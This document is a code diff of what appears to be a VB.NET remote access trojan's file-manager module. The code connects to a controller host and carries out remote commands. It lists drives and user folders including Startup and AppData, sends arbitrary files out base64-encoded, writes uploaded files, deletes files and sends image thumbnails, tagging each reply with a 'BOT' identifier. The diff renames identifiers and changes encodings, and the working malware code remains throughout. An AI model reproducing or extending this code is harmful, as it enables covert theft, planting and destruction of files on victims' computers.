@@ -41,7 +41,7 @@ Public Class Main
             lp = 0
             C.Client.Connect(H, P)
             Alive = True
-            Send("OFM" + SPL + HWID)
+            Send("OFM" + SPL + BOT)
         Catch ex As Exception
             GoTo cc
         End Try
@@ -107,51 +107,51 @@ cc:
         Try
             Select Case A(0)
                 Case "Drivers"
-                    Send("FM" & SPL & HWID & SPL & FMDrives())
+                    Send("FM" & SPL & BOT & SPL & FMDrives())
                     Exit Select
 
                 Case "FM"
-                    Send("FM" & SPL & HWID & SPL & FMFolders(A(1)) & FMFiles(A(1)))
+                    Send("FM" & SPL & BOT & SPL & FMFolders(A(1)) & FMFiles(A(1)))
                     Exit Select
 
                 Case "DW"
                     If IO.File.Exists(A(1)) Then
-                        Send("DW" + SPL + HWID + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) + SPL + IO.Path.GetFileName(A(1)))
+                        Send("DW" + SPL + BOT + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) + SPL + IO.Path.GetFileName(A(1)))
                     End If
                     Exit Select
 
                 Case "UP"
                     IO.File.WriteAllBytes(A(1), GZip(SB(A(2)), False))
-                    Send("UP" + SPL + HWID + SPL + IO.Path.GetFileName(A(1)))
+                    Send("UP" + SPL + BOT + SPL + IO.Path.GetFileName(A(1)))
                     Exit Select
 
                 Case "DEL"
                     If IO.File.Exists(A(1)) Then
                         IO.File.Delete(A(1))
-                        Send("DEL" + SPL + HWID)
+                        Send("DEL" + SPL + BOT)
                     End If
                     Exit Select
 
                 Case "GOTO"
                     Select Case A(1)
                         Case "Desktop"
-                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
+                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                             Exit Select
 
                         Case "AppData"
-                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
+                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                             Exit Select
 
                         Case "Temp"
-                            Send("FM" & SPL & HWID & SPL & FMFolders(Environ("Temp")) & FMFiles(Environ("Temp")) & SPL & Environ("Temp"))
+                            Send("FM" & SPL & BOT & SPL & FMFolders(Environ("Temp")) & FMFiles(Environ("Temp")) & SPL & Environ("Temp"))
                             Exit Select
 
                         Case "User"
-                            Send("FM" & SPL & HWID & SPL & FMFolders(Environ("UserProfile")) & FMFiles(Environ("UserProfile")) & SPL & Environ("UserProfile"))
+                            Send("FM" & SPL & BOT & SPL & FMFolders(Environ("UserProfile")) & FMFiles(Environ("UserProfile")) & SPL & Environ("UserProfile"))
                             Exit Select
 
                         Case "Startup"
-                            Send("FM" & SPL & HWID & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Startup))
+                            Send("FM" & SPL & BOT & SPL & FMFolders(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & FMFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup)) & SPL & Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                             Exit Select
                     End Select
 
@@ -166,7 +166,7 @@ cc:
                         G.Dispose()
                         BM.Dispose()
                         TUMB.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
-                        Send("PRE" & SPL & HWID & SPL & BS(MM.ToArray))
+                        Send("PRE" & SPL & BOT & SPL & Text.Encoding.Default.GetString(MM.ToArray))
                         MM.Dispose()
                         TUMB.Dispose()
                         Exit Select
@@ -184,7 +184,7 @@ cc:
                     CloseMe()
             End Select
         Catch ex As Exception
-            Send("FM" & SPL & HWID & SPL & "Error " + SPL + ex.Message)
+            Send("FM" & SPL & BOT & SPL & "Error " + SPL + ex.Message)
         End Try
 
     End Sub
@@ -254,11 +254,11 @@ cc:
     Public Shared Alive As Boolean = False
 
     Public Shared Function SB(ByVal s As String) As Byte()
-        Return Text.Encoding.Default.GetBytes(s)
+        Return Text.Encoding.UTF8.GetBytes(s)
     End Function
 
     Public Shared Function BS(ByVal b As Byte()) As String
-        Return Text.Encoding.Default.GetString(b)
+        Return Text.Encoding.UTF8.GetString(b)
     End Function
 
     Public Shared Function AES_Encrypt(ByVal input As String)
